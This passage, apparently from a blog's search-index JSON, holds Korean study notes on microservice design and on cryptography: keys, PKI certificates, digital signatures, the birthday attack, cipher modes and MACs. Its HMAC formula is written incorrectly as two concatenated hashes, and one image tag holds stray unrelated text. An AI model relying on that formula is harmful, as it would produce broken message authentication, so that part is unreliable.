관찰할 수 있는가? 뭔가 잘못되면 누군가 알림을 받는가? 장애 내성 단일 장애 지점을 어떻게 극복할 것인가? 의존하는 다른 서비스의 장애를 어떻게 대응할 것인가? MSA 초기 단계 기본 원칙 품질 관리 : 코드 변경을 리뷰하고, 적절한 테스트를 작성하고 소스 코드의 버전 제어를 관리한다. 자동 배포 : 코드 변경을 운영으로 전달하는 것을 완전하게 검증하고 엔지니어의 개입을 최소화 해야한다. 회복성 : 서비스가 어떻게 실패할 수 있고 능동적으로 어떻게 사전에 대책을 강구할 수 있는지를 고려해야 한다. 투명성 : 서비스의 상태와 행동은 관측 가능해야 한다. 콘웨이의 법칙(Conway’s law) 소프트웨어 구조는 해당 소프트웨어를 개발한 조직의 커뮤니케이션 구조를 닮게 된다. https://johngrib.github.io/wiki/Conway-s-law/ 아키텍처 원칙 개발 실무는 외부 표준을 준수해야 한다. (ISO 27001) 모든 데이터는 이동 가능해야 하고 보관 기간을 제한하는 것을 염두에 둬야 한다. 개인 정보는 어플리케이션을 통해 명확하게 추적할 수 있어야 한다. Bounded Context 컨텍스트 내의 모델은 응집도가 높고 실 세계와 동일한 뷰를 가진다 명확한 범위와 경계를 가지는 응집된 단위 OpenAPI Specification https://github.com/OAI/OpenAPI-Specification Community-driven open specification within the OpenAPI Initiative (https://www.openapis.org/) YANGI You Aren’t Gonna Need It. DRY don`t repeat yourself. 중복된 반복 작업 CAP Consistency (일관성) Availability (가용성) Partition Tolerance (파티션 내성) CAP Twelve Years Later : How the ‘Rules’ have changed / Http://mng.bz/HGA3 http://ksat.me/a-plain-english-introduction-to-cap-theorem CQRS choreographed 자율적으로 구성된 SAGA pattern Life Beyond Distributed Transactions http://queue.acm.org/detail/cfm?id=3025012 Choreography SAGA Pattern Orchestration SAGA Pattern (조율된 사가 패턴) netflix conductor Inten SAGA Pattern (중첩된 사가 패턴) 회로 차단하기 (short-circuiting) 잠그기 (Locking) 인터럽트 (Interruption) 일관성 패턴 보상 동작 : 이전 동작을 없던 일로 하는 동작을 수행한다. 재시도 : 성공 또는 시간 만료될 때가지 재시도한다. 무시 : 에러 이벤트가 발생해도 아무것도 하지 않는다. 재시작 : 원래 상태로 초기화하고 다시 시작한다. 잠정적 동작 : 잠정적 동작을 수행하고 나중에 확정 또는 취소한다. 이벤트 소싱 패턴 Nick Chamberlain : awesome-ddd (https://github.com/heynickc/awesome-ddd) Cache Problem https://markheath.net/post/troublehooting-caching-problems Idempotent 멱등성 : 연산을 여러번 적용 하더라도 결과가 달라지지 않는 성질 신뢰할 수 있는 커뮤니케이션 설계하기 재시도 : 기하급수적 백-오프(exponential back-off) 항상 최대 재시도 횟수를 제한한다. 기하급수적 백-오프와 지터(무작위 요소; jitter)를 포함해서 재시도 요청을 부드럽게 분산시키고 부하가 몰리는 것을 회피한다. 어떤 에러 조건에서 재시도를 해야 할지, 그래서 어떤 재시도가 실패할 것 같은지를 고려한다. 폴백 우아한 서비스의 저하(graceful degradation) 캐싱 (Caching) 기능 중복 (Functional redundancy) 대체 데이터 (Stubbed data) 타임 아웃 회로 차단기 (서킷 브레이커) half open","categories":[{"name":"MicroServiceArchitecture","slug":"MicroServiceArchitecture","permalink":"https://blog.devkwang.app/categories/MicroServiceArchitecture/"}],"tags":[{"name":"keyword","slug":"keyword","permalink":"https://blog.devkwang.app/tags/keyword/"}]},{"title":"cryptography-key","slug":"cryptography-key","date":"2020-04-16T03:06:54.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/16/cryptography-key/","link":"","permalink":"https://blog.devkwang.app/2020/04/16/cryptography-key/","excerpt":"","text":"키 키는 대단히 큰 수 암호 기술을 사용하려면 반드시 키라 불리는 대단히 큰 수가 필요 중요한 것은 수 그 자체의 크기보다도 키 공간(Key Space)의 크기 키 공간의 크기는 키의 비트 길이로 결정 암호별 키 길이 AES: 128,192,256 비트 RSA: 1024, 2048 키는 평문과 동일한 가치를 갖는다 키는 평문과 같은 가치 도청자 이브에게 키는 평문과 같은 것 암호 알고리즘과 키 암호의 기본 상식 검증된 암호 알고리즘을 사용 정보의 기밀성은 암호 알고리즘을 비밀로 하는 것이 아님 키를 비밀로 하는 것에 의해 기밀성이 지켜져야 함 다양한 키 대칭 암호 키는 송신자와 수신자만 공유 양측이 공유 키를 비밀로 유지 공개 키 암호 암호화와 복호화에서 다른 키 사용 개인 키를 비밀로 유지 메세지 인증 코드 송신자와 수신자가 공통의 키를 사용해서 인증을 수행 디지털 서명 서명 작성과 서명 검증에 서로 다른 키를 사용 기밀성을 위한 키와 인증을 위한 키 보안 속성에 따른 분류 기밀성을 유지하기 위한 키 대칭 암호나 공개 키 암호에서 사용하는 키 복호화 키를 모르면 복호화 불가 인증을 수행하기 위한 키 메세지 인증 코드나 디지털 서명에서 사용하는 키 키를 모르면 데이터 변경이나 위장 불가 키 사용 횟수에 따른 분류 세션 키(Session Key) 통신 때마다 한 번만 사용 되는 키 마스터 키(Master Key) 반복적으로 사용 되는 키 컨텐츠를 암호화 하는 키와 키를 암호화 하는 키 CEK (contents encrypting key) : 정보(콘텐츠)가 암호화의 대상 KEK (key encrypting key) : 키가 암호화의 대상 키 관리 키 생성 난수를 이용한 키 생성 난수 사용 : 키 성질로 다른 사람이 추측하기 어려워야 한다를 가져야 하기 때문 난수 생성 : 하드웨어를 사용하는 것이 좋지만, 통상적으로 암호용으로 설계된 의사 난수 생성기 소프트웨어를 사용 자신이 적당한 바이트 열을 만들면 안 됨 스스로는 랜덤한 값이라고 생각하고 생성해도, 거기에는 인위적인 편중이 있기 때문에 랜덤한 값이 되지 못함 암호용으로 이용하는 의사난수 생성기 반드시 암호용으로 설계되어 있는 것을 선택 암호용으로 설계되어 있지 않은 의사난수 생성기는 예측불가능 성질을 갖지 않기 때문 패스워드를 이용한 키 생성 패스워드 (password) 패스 프레이즈 (passphrase) : 복수의 단어로 이루어지는 긴 패스워드 패스워드를 키로 직접 이용하지 않고, 패스워드를 일방향 해시 함수에 입력해서 얻어진 해시 값을 키로 이용 PBE와 salt Password Based Encryption 패스워드에 salt라 불리는 난수를 부가해서 일방향 해시 함수에 입력하고 그 출력을 키로 사용 사전 공격(Dictinary attack)을 막기 위한 조치 키 배송 키 배송 문제 키를 사전에 공유 키 배포 센터 공개키 암호 Diffie-Hellman 키 교환 키 갱신 (key updating) 현재 키의 해시값을 다음 키로 사용 키 노출시 과거 통신의 복호화를 막을 수 있다. 이를 백워드 시큐리티라 한다. 키 보존 키를 반복해서 사용할 경우 키 보존 문제를 고려 키 기억 : 보통 실용적 키의 크기나 비트화된 표현 등으로 기억할 수 없다. 키 암호화 : KEK(Key Encryption Key) https://www.crocus.co.kr/1233 https://rsec.kr/?p=242","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"key","slug":"key","permalink":"https://blog.devkwang.app/tags/key/"}]},{"title":"cryptography-certification","slug":"cryptography-certification","date":"2020-04-13T09:32:33.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/13/cryptography-certification/","link":"","permalink":"https://blog.devkwang.app/2020/04/13/cryptography-certification/","excerpt":"","text":"인증서 공개키 인증서(public-key certificate: PKC) 이름이나 소속, 메일 주소 등의 개인 정보 당사자의 공개 키가 기재 인증기관(CA; certification authority)의 개인 키로 디지털 서명 인증서를 사용하는 시나리오 공인 인증서 종류 전자서명용 인증서(Digital Signature Certificate) 거래 상대방에 대한 신원확인(인증), 전자문서의 위.변조여부의 검출(무결성), 전자문서 송.수신자간의 송.수신사실 여부에 대한 ⑨부인방지(부인봉쇄) 목적으로 사용 암호화용 인증서(Encryption Certificate) 적법한 송.수신자를 제외한 제3자가 전송중인 메시지를 보지 못하도록 하는데 사용(비밀성) 클라언트 SSL 인증서(Client SSL Certificate) 클라이언트와 서버가 안전한 통신을 하고자 할 때, 서버가 클라이언트의 신원확인을 위해 사용 Form Signing, SSO(Single Sign On)에서 사용 서버 SSL 인증서(Sever SSL Certificate) 클라이언트와 서버가 안전한 통신을 하고자 할 때, 클라이언트가 서버의 신원확인을 위해 사용 ⓓS/MIME 인증서(S/MIME Certificate) 전자메일에 전자서명 하거나 전자메일의 암호화를 위해서 사용 소프트웨어 배포용 인증서(Code-Signing Certificate) 인터넷과 같은 안전하지 않은 통신망을 통해 소프트웨어를 안전하게 배포할 목적으로 사용하는 인증서로서 Java code, Javascript 등 소프트웨어 코드에 그 제작자가 전자서명을 함으로써, 제작자의 신원확인과 전송과정에서의 소프트웨어의 위.변조를 확인할 용도로 사용합니다. 인증기관용 인증서(CA Certificate) CA의 확인을 위해 사용 클라이언트와 서버의 S/W에서 다른 인증서의 신뢰여부를 검증할 때 사용 Verisign 무료 서비스 개인을 위한 인증서(digital ID) 를 60일간 무료 시험판으로 만들어서 제공 웹 브라우저만 있으면 온라인에서 바로 발행할 수 있으며 본인 인증은 메일이 도착했는지 여부만으로 확인 Https로 보호된 웹 사이트에서 이름, 메일 주소, 패스워드를 입력하고 인증서 작성 123456789• Organization = KECA, Inc.• Organizational Unit = CrossCert Class 1 Consumer Individual Subscriber CA• Organizational Unit = Terms of use at www.crosscert.com/rpa (c)01• Organizational Unit = Authenticated by CrossCert• Organizational Unit = Member, VeriSign Trust Network• Organizational Unit = Persona Not Validated• Organizational Unit = Digital ID Class 1 - Netscape• Common Name = Gil Dong Hong• Email Address = gildong@gmail.com 인증서의 표준 규격 X.509 X.509 가장 널리 사용 ITU, ISO에서 규정한 규격으로 인증서의 생성 교환을 수행할 때 사용 X.509 v3 디지털 인증서의 구조 Certificate Version 인증서의 버전을 나타냄 Serial Number CA가 할당한 정수로 된 고유 번호 Signature 서명 알고리즘 식별자 Issuer 발행자 Validity 유효기간 Not Before 유효기간 시작 날짜 Not After 유효기간 끝나는 날짜 Subject 소유자 Subject Public Key Info 소유자 공개 키 정보 Public Key Algorithm 공개 키 알고리즘 Subject Public Key Issuer Unique Identifier (Optional) 발행자 고유 식별자 Subject Unique Identifier (Optional) 소유자 고유 식별자 Extensions (Optional) 확장 Certificate Signature Algorithm Certificate Signature 인증서 파일 확장 .CER(Window) .CRT(Linux) - CER 암호화 된 인증서. 복수의 인자증서도 가능. .DER - DER 암호화 된 인증서. .PEM - (Privacy Enhanced Mail) Base64로 인코딩 된 인증서. &quot;-----BEGIN CERTIFICATE-----&quot;와 “-----END CERTIFICATE-----” 가운데에 들어간다. .P7B - .p7c 참조. .P7C - PKCS#7 서명 자료 구조(자료는 제외), 인증서이거나 CRL(복수도 가능). .PFX - .p12 참조. .P12 - PKCS#12, 공개 인증서와 암호로 보호되는 개인 키를 가질 수 있다(복수도 가능). 공개 키 기반 구조 (PKI) 공개 키 기반(public key infrastructure) 공개 키를 효과적으로 운용하기 위해 정한 규격이나 선택사양의 총칭 PKCS(Public-Key Cryptography Standards) : RSA사가 정하고 있는 규격의 집합 RFC(Requests for Comments) 중에서도 PKI에 관련된 문서 X.509 API 사양서 PKI 구성 요소 이용자 : PKI를 이용하는 사람 인증기관 : 인증서를 발행 하는 사람 저장소 : 인증서를 보관하고 있는 데이터 베이스 이용자 PKI를 사용해서 자신의 공개 키를 등록하고 싶어 하는 사람과 등록되어 있는 공개 키를 사용하고 싶어 하는 사람 이용자가 하는일 키 쌍을 작성한다 인증 기관에 공개 키를 등록한다 인증 기관으로부터 인증서를 발행 받는다 수신한 암호문을 복호화 한다. 메세지에 디지털 서명을 한다. 공개키 사용자가 하는 메시지를 암호화해서 수신자에게 송신한다 디지털 서명을 검증한다.일 인증 기관 (CA; certification authority) 인증서의 관리를 행하는 기관 키 쌍을 작성한다 공개키 등록 때 본인을 인증한다 인증서 작성 발행, 폐지 등록 기관 (RA; registration authority) 인증 기관의 일중 공개키의 등록과 본인에 대한 인증을 대행 하는 기관 한국 공인 인증 기관 공인인증기관 웹페이지 힌국정보인증(주) http://www.signgate.com (주)코스콤 http://www.signkorea.com 금융결제원 http://www.yessign.com 한국전자인증(주) http://www.crosscert.com 한국무역정보통신 http://tradesign.net 저장소 (repository) 인증서를 보존해 두고, PKI의 이용자가 인증서를 입수할 수 있도록 한 데이터 베이스 인증서 디렉토리 인증 기관의 역할 키 쌍의 작성 PKI의 이용자가 작성하거나 인증기관이 이용자의 키 쌍을 생성할 경우 개인 키를 이용자에게 보내는 추가 업무를 해야한다. PKCS #12 (Personal Information Exchange Syntax Standard) 인증서 등록 이용자는 인증 기관에 인증서 작성을 의뢰 규격 : PKCS #10 (Certification Request Syntax Standard) 운용 규격 (CPS; certification practice statement)에 근거해서 이용자를 인증하고, 인증서를 작성 인증서 형식 : PKCS #6 (Extended-Certificate Syntax Standard)나 X.509로 정의 인증서의 폐지 이용자가 개인키에 대한 권한을 잃거나 개인키를 분실 혹은 도난 당했을 경우 인증기관은 인증서를 폐지(revoke)해서 무효화 해야한다. 인증서를 폐지하는 경우 인증기관은 인증서 폐지 목록(CRL) 을 작성한다. CRL(Certification revocation list)관리 인증기관이 폐지한 인증서의 일련번호의 목록에 대해 인증기관이 디지털 서명을 붙인 것이다. 인증기관의 최신 CRL을 조사해서 그 인증서가 유효한지 아닌지를 확실히 확인 할 필요가 있다 계층 구조를 갖는 인증서 루트 CA 최상위 인증기관 셀프 서명(Self-signature) 자기 자신의 공개 키에 대해서 자신의 개인 키로 서명하는 디지털 서명 한국의 PKI 한국인터넷진흥원 전자서명인증관리센터(http://rootca.kisa.or.kr) 공인 인증서 대체 기술 핸드폰 개통할 때 계좌 인증, 카드 인증 사용 구분 주요 내용 휴대폰 본인 확인 본인 확인 기관으로 지정된 통신 3사가 휴대폰 개통 과정에서 수집된 개인정보를 활용해 본인 여부 확인 계좌 인증 신분 확인을 통해 개설된 은행계좌에 소액입금과 함께 임의적 문자를 송부해 본인 여부 확인 카드 인증 신분확인을 통해 발급된 신용카드의 정보입력을 통해 본인 여부 확인 공공 민간 전자 서명 공인인증기관 본인확인기관 정의 공인인증업무를 제공 하기 위한 기관 주민등록번호 외 본인 확인 업무를 제공하는 기관 업체 한국정보인증,코스콤,금융결제원 등 6개 공인인증 기관,3사 통신사, 카드사 등","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"pki","slug":"pki","permalink":"https://blog.devkwang.app/tags/pki/"},{"name":"certification","slug":"certification","permalink":"https://blog.devkwang.app/tags/certification/"}]},{"title":"cryptography-digital-signature","slug":"cryptography-digital-signature","date":"2020-04-13T08:57:47.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/13/cryptography-digital-signature/","link":"","permalink":"https://blog.devkwang.app/2020/04/13/cryptography-digital-signature/","excerpt":"","text":"Digital signature characteristics Unforgeable (위조불가) 서명자만이 서명문을 생성 가능 Authentic (서명자 인증) 서명문의 서명자를 확인 가능 Not Reusable (재사용 불가) 서명문의 서명은 다른 문서의 서명으로 사용 불가능 Unalterable (변경 불가) 서명된 문서의 내용 변경 불가능 Nonrepudiation (부인 불가) 서명자는 후에 서명한 사실을 부인 불가능 Digital signature Requirement 서명은 메세지에 의존하는 비트 형태이어야 한다. 위조와 부인 방지 위해, 송신자의 유일한 정보 비트를 이용해야 함 서명문을 만들기가 쉬워야 한다. 서명문을 인식, 확인 하기가 쉬워야 한다. 서명문을 위조하는 것이 계산적으로 실행 불가능 기억장소에 서명문의 복사본을 유지하는 것이 실용적이어야 한다. 메시지에 직접 서명하는 방법 메세지의 해시 값에 서명하는 방법 디지털 서명에 대한 의문 암호문이 왜 서명으로서 사용 가능한 것인가? 개인 키로 암호화 한다는 것은, 행하고 있는 처리의 내용을 설명한 것이지, 여기에서는 기밀성을 실현하기 위해 암호화 하는 것이 아니다 인증자 (authenticator) : 키를 가지고 있는 사람만이 만들 수 있는 정보 기밀성을 유지할 수 없는 것은 아닐까? 디지털 서명은 기밀성을 지키기 위한 것은 아님 기밀성이 필요하다면 암호화를 별도로 행해서 보내야 한다. 복사된 서명이 만들어지는 것은 아닐까? 통상의 파일 복사처럼 서명도 복사본을 만들수 있다. 서명 복사를 만들 수 있다고 해서 서명이 무의미 해 지는 것은 아니다. 복사한 데이터가 표현하고 있는 것은 특정의 서명자가 특정의 메세지에 서명했다고 하는 것뿐 복사해도 서명자는 바뀌지 않고 메세지의 내용도 바뀌지 않는다. 복사된 서명 특정 서명자와 특정 메세지가 결부되어 있다는 사실이 중요 아무리 복사를 해도 그 메세지에 누가 서명했는가는 사실에는 변화가 없다. 서명 변경이 가능한 것은 아닐까? 서명 후 메세지와 서명의 내용을 수정할 수는 있다. 수정하면 서명 검증에 실패하기 때문에, 검증하는 사람은 수정이 행해졌다는 것을 검출 할 수 있다. 서명 대상의 메세지와 서명 양쪽을 수정해서 서명의 검증에 성공할 수 있도록 앞뒤를 잘 맞출 수 있지는 않을까? 불가능 서명만 재이용할 수 있는 것은 아닐까? 서명부분만 잘라내서 다른 메세지에 첨부하는 것은 가능하나 서명의 검증에는 실패 서명을 삭제하더라도 계약파기를 할 수 없는 것은 아닌가? 디지털 서명이 붙은 차용서는 삭제해도 파기 할 수 없다. 디지털 서명이 붙은 차용서를 파기하는 경우에는 영수증에 상당하는 문서를 새로 만들고, 그것에 대해 상대에게 서명을 부탁해야 한다. 어떻게 해서 부인 방지가 되는 것인가? 디지털 서명의 경우 서명을 작성할 수 있는 키(개인 키)는 송신자마ㄴ 가지고 있다. 그러므로 서명을 작성할 수 있는 것은 송신자 뿐 그 서명을 내가 작성한 것이 아니다 라고 주장 할 수 없다. 활용 예 보안 공지 클리어 서명(Clearsign) : 메세지를 암호화하지 않고 서명만 한것 소프트 웨어 다운로드 소프트웨어에 디지털 서명을 작성하고, 서명 검증 공개 키 인증서 디지털 서명을 검증하려면 바른 공개 키가 필요 자신이 입수한 공개키가 바른 공개 키인지 어떤지를 검증하기 위해서 공개 키를 메세지로 간주하고 디지털 서명을 한다. 공개 키 인증서 : 공개키에 디지털 서명을 붙인 것 TLS TLS에서는 서버가 올바른 것이라는 것을 인증하기 위해서 서버 인증서를 이용하며 서버의 공개키에 디지털 서명을 한 것. RSA에 의한 디지털 서명 서명(s) = mDmodN{m^D mod N}mDmodN 서명으로 얻어진 메세지(m) = sEmodN{s^E mod N}sEmodN E와 N은 서명자의 공개키 공개키 (E,N) 개인키 (D,N) 서명의 작성 서명(s) = mDmodN{m^D mod N}mDmodN (메세지를 D제곱해서 N으로 나눈 나머지) 서명의 검증 서명으로 얻어진 메세지(m) = sEmodN{s^E mod N}sEmodN (m과 원래 메세지 비교) 디지털 서명에 대한 공격 중간자 공격 입수한 공개 키가 정확한 상대의 것인지 아닌지를 확인하는 것이 필요 공개 키를 취급하는 소프트웨어는 공개 키의 해시 값을 표시하는 수단을 준비 (fingerprint) 일방향 해시 함수 공격 일방향 해시 함수는 충돌 내성을 가져야 한다. 디지털 서명을 사용한 공개 키 암호 공격 모르는 메세지에는 서명을 하지 말자. 기술적인 방법만으로는 해결할 수 없는 문제","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"digital signature","slug":"digital-signature","permalink":"https://blog.devkwang.app/tags/digital-signature/"}]},{"title":"cryptography-birthday-attack","slug":"cryptography-birthday-attack","date":"2020-04-08T11:43:42.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/08/cryptography-birthday-attack/","link":"","permalink":"https://blog.devkwang.app/2020/04/08/cryptography-birthday-attack/","excerpt":"","text":"비둘기집의 원리 n+1개읜 물건을 n개의 상재에 넣을 때 적어도 어느 한 상자에는 두 개 이상의 물건이 들어 있다는 원리를 말한다. 비둘기와 비둘기집의 형태로 비유되어 쓰이며, '서랍-양말’로 비유하여 서랍원칙으로 나타내기도 한다. n개의 비둘기집과 n+1마리의 비둘기가 있다고 가정한다. 만약 각 비둘기집에 한 마리 이하의 비둘기만 들어 있다면, 전체 비둘기집에는 많아야 n마리의 비둘기가 존재한다. 그런데 비둘기는 모두n+1마리이므로, 이것은 모순이다. 따라서 어느 비둘기집에는 두 마리 이상의 비둘기가 있다. 일반화 n개의 별개의 사물을 m개의 용기에 나누어 담으면 적어도 한 개의 용기는 [nm]\\begin{bmatrix}\\frac{n}{m}\\end{bmatrix}[mn​​] 이상의 사물을 담고 있어야 한다. (여기서, [x]\\begin{bmatrix}{x}\\end{bmatrix}[x​]는 x보다 작지 않은 최소 정수를 의미한다.) 확률론적으로 일반화 된 비둘기집 원리는 다음과 같다. 1m\\frac{1}{m}m1​의 균일한 확률로 n개의 비둘기를 무작위로 m개의 비둘기집에 넣었다면 확률적으로 적어도 하나의 비둘기집에 두마리 이상의 비둘기가 들어가게 된다. 1−m!(m−n)! mn=1−m(m−1)(m−2)⋯(m−n+1)mn ⁣1-{\\frac {m!}{(m-n)!\\;m^{n}}}=1-{\\frac {m(m-1)(m-2)\\cdots (m-n+1)}{m^{n}}}\\!1−(m−n)!mnm!​=1−mnm(m−1)(m−2)⋯(m−n+1)​ 비둘기의 수가 비둘기집의 수를 초과하지 않는다 하더라도, 비둘기 분배의 무작위적인 성질에 의하여 종종 상당한 확률로 충돌이 일어난다. Birthday Problem 사람이 임의로 모였을 때 그 중에 생일이 같은 두명이 존재할 확률을 구하는 문제 생일의 가능한 가짓수는 366개 이므로 366명 이상의 사람이 모인다면 비둘기집 원리에 따라 생일이 같은 두 명이 반드시 존재 생일이 같은 두 사람을 찾는 것과 비슷하게, 암호학적 해시 결과가 같은(해시 충돌) 두 입력값을 찾는 것 역시 모든 입력값을 계산하지 않아도 충분히 높은 확률로 해시 충돌을 찾을 수 있다. 이러한 암호 공격을 생일 공격(birthday attack)이라고 부른다. 확률 계산 n명의 사람이 있을 때 그 중 생일이 같은 사람이 둘 이상 있을 확률을 p(n){p(n)}p(n) 이라고 한다면, 반대로 모든 사람의 생일이 다를 확률 p‾(n)\\overline{p}{(n)}p​(n)은 1−p(n)1-{p(n)}1−p(n) 이 된다. p‾(n)\\overline{p}{(n)}p​(n)을 구해보면 두번째 사람의 생일은 첫 번째 사람과 다르고, 세 번째 사람의 생일은 첫번째와 두번째 모두와 달라야 한다. 최종적으로 구하고자 하는 생일이 같은 사람이 둘 이상 있을 확률 p(n){p(n)}p(n)은 p(n)=1−365!365n∗(365−n)!{p(n)} = 1 - {\\frac{365!}{365^n * (365-n)!}}p(n)=1−365n∗(365−n)!365!​ 가 된다. 여기서, n≦365{n\\leqq365}n≦365 인 자연수이고, !는 계승을 의미한다. 여기서 p(n){p(n)}p(n) 값을 특정 n 값에 대해 계산하면 다음과 같다. n p(n){p(n)}p(n) 1 0.0% 5 2.7% 10 11.7% 20 41.1% 23 50.7% 30 70.6% 40 89.1% 50 97.0% 60 99.4% 70 99.9% 100 99.99997% 즉 23명 이상 모이면 같은 확률이 50% 이상이고, 100명이 모이면 거의 1에 가까워지는것을 알 수 있다.","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"hash","slug":"hash","permalink":"https://blog.devkwang.app/tags/hash/"}]},{"title":"cryptography-block-cipher","slug":"cryptography-block-cipher","date":"2020-04-08T04:15:22.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/08/cryptography-block-cipher/","link":"","permalink":"https://blog.devkwang.app/2020/04/08/cryptography-block-cipher/","excerpt":"","text":"block cipher DES : 보안 취약점 발견으로 이제 안씀 AES 전 세계 공모를 통해 선정 벨기에의 암호학자 2명이 제출한 Rijndael AES is a block cipher with a fixed block size of 128 bit (16 byte) Padding 입력 데이터가 블록 사이즈의 배수가 아니라면 블록 사임ㅇㄹ호즈에 맞추기 위한 방식이 Padding 부족한 size 만큼 바이트 값을 추가하는 PKCS7 Padding을 많이 사용 3Byte가 부족할 경우 03d을 3개 패딩 ![](온라인 상점은 Microservice 아키텍처 패턴을 사용하므로 제품 세부 사항 데이터가 여러 서비스에 분산됩니다. 예를 들어 ) Operation Mode 입력데이터가 블록보다 크면 암/복호화시 여러 개의 블록이 생성됨 각 블록간의 관계를 처리하는게 운영 모드 ECB, CBC, CFR, GCM 등의 모드가 있음 ECB Electronic Code Book 동일한 내용을 갖는 평문 블록은 이에 대응 되면 동일한 암호문 블록으로 변환되고 1:1 대응표를 갖게 된다. 대칭키 암호화시 ECB를 사용하면 안됨 CBC Cipher Block Chaining Message Authentication Code 에 사용 불 암호화 직전 블록은 다음 블록의 입력으로 사용하여 안정성이 증대됨 초기 블록이 유추가 어렵도록 Initial Vector 사용 1단계 전에 수행되어 결과로 출력된 암호문 블록에 평문 블록을 XOR 하고 나서 암호화를 수행 그결과 생성되는 각각의 암호문 블록은 단지 현재 평문 블록뿐만 아니라 그 이전의 평문 블록들의 영향 복호화 최초 암호문 블록을 XOR 하고 나서 복호화의 결과와 IV를 이용해 최초 평문 블록 P1을 만들고 나머지는 복호화 XOR을 통해 최초 평문 블록을 만든다. 암호문 블록이 손상되면 이후 블록들이 전부 손상된다. GCM Galois/Counter Mode Padding 불필요 인증 기능 제공 병렬 처리가 가능해서 암/복호화 속도가 매우 빠름, SSL/TLS 에서 많이 사용 Block Size : 128/192/256 CFB Cipher FeedBack 1단계 앞의 암호문 블록을 암호 알고리즘의 입력으로 사용 피드백 : 암호화의 입력으로 사용 한 단계앞의 암호문 블록을 암호화 한 후 평문 블록과 XOR 연산 최초의 암호문 블록을 만들어낼 때는 1단계 앞의 출력이 존재하지 않으므로 대신에 초기화 벡터(Initial Vector) 사용 replay attack 가능 OFB Output FeedBack 암호 알고리즘의 출력을 암호 알고리즘의 입력으로 피드백 평문 블록은 암호 알고리즘에 의해 직접 암호화 되고 있는 것은 아님 CTR CounTeR 모드 1씩 증가해 가는 카운터를 암호화해서 키 스트림을 만들어 내는 스트림 암호 CTR 모드에서는 블록을 암호화 할 때 마다 1씩 증가해 가는 카운터를 암호화해서 키 스트림을 만듬 카운터를 암호화 한 비트열과 평문 블록과 XOR을 취한 결과가 암호문 블록이 됨 카운터의 초기값은 암호화 때마다 다른 값(nonce, 비표)을 기초로 해서 만든다 CTR 암호화 CTR 복호화 CTR 모드의 암호화와 복호화는 완전히 같은 구조 CTR 모드는 블록을 임의의 순서로 암호화, 복호화 할 수 있다. 프로그램으로 구현하는 것이 매우 간단 병렬 처리가 가능한 시스템에서는 CTR 모드를 이용하여 자료를 고속 처리 CTR Counter size 16byte AES128/AES192/AES256 암호화 키 사이즈가 각각의 bit CBC, CTR을 중점으로 보자","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"pki","slug":"pki","permalink":"https://blog.devkwang.app/tags/pki/"}]},{"title":"cryptography-message-authentication-code","slug":"cryptography-message-authentication-code","date":"2020-04-08T02:00:48.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/08/cryptography-message-authentication-code/","link":"","permalink":"https://blog.devkwang.app/2020/04/08/cryptography-message-authentication-code/","excerpt":"","text":"메세지 인증 Message Authentication : 메시지가 올바른 송신자로 부터 온것이다 Message Authentication Code (MAC) 무결성 메세지 인증 입력 : 메세지, 공유하는 키 출력 : 고정 비트 길이의 코드 메시지 인증 순서 앨리스와 수신자 A은행 키(K) 공유 앨리스 : 송금 의뢰 메세지(M) 작성 MAC 값 (MAC(M)) 계산 앨리스 : 수신자 A 은행으로 메세지와 MAC 값을 전송 수신자 A은행 : 수신한 송금 의뢰 메세지를 기초로 해서 MAC 값을 계산 수신자 A은행 : 앨리스로부터 수신한 MAC 값과 4에서 계산한 MAC 값을 비교 수신자 A은행 : MAC 값이 같다면 인증 성공, 다르다면 인증 실패(앨리스로부터 온 것이 아니라고 판단) 메시지 인증 코드의 키 배송 문제 키 배송 문제 해결 공개키 암호 Diffie-Hellman 키 교환 키 배포 센터 키를 안전한 방법으로 별도로 보내기 메세지 인증 코드 구현 Hash HMAC Block triple DES, AES 블록 암호 키를 메세지 인증 코드의 공유키로 사용 CBC 모드로 메세지 전체를 암호화 메세지 인증 코드에서는 복호화를 할 필요가 없으므로 최종 블록 이외는 폐기 최종 블록을 MAC 값으로 이용 GCM Galois/Counter Mode Padding 불필요 인증 기능 제공 병렬 처리가 가능해서 암/복호화 속도가 매우 빠름, SSL/TLS 에서 많이 사용 c : Cypher message m : message KEK_EKE​ : Message를 암호화 할 Key KIK_IKI​ : Tag를 암호화 할 Key E(KE,m)E(K_E,m)E(KE​,m) : message 암호화 S(KI,c)S(K_I,c)S(KI​,c) : c로 MAC값 계산 E(KE,m∣∣tag)E(K_E, m||tag)E(KE​,m∣∣tag) Encrypt-then-MAC 평문을 대칭 암호로 암호화 한 후 암호문의 MAC 값을 계싼 메세지 인증 코드 입력에 암호문을 부여 선택 암호문 공격을 막을 수 있다. ex) IPsec Encrypt-and-MAC 평문을 대칭 암호로 암호화 한 후 그와는 별도로 평문의 MAC 값을 얻는 방법 ex) SSH MAC-then-Encrypt 미리 평문의 MAC 값을 얻고, 평문과 MAC 값 양쪽을 정리하여 대칭 암호로 암호화 하는 방법 ex) SSL GMAC Galois/Counter Mode MAC GCM을 메세지 인증 코드 전용으로 사용 HMAC Hash Message Authentication Code 일방향 해시 함수를 이용하여 메시지 인증 코드를 구성 HMAC의 일방향 해시 함수는 모듈형으로 골라서 사용 HMAC-SHA1 : SHA-1 RFC 2104 정의 HMAC(K,m)=H((K′⊕opad))∣∣H((K′⊕ipad∣∣m))HMAC(K,m) = H\\big( ({K&#x27;}\\oplus opad ) \\big) || H\\big( ({K&#x27;}\\oplus ipad || m)\\big )HMAC(K,m)=H((K′⊕opad))∣∣H((K′⊕ipad∣∣m)) K′={H(K)K is larger than block sizeKotherwiseK&#x27; = \\begin{cases} H(K) &amp;\\text{K is larger than 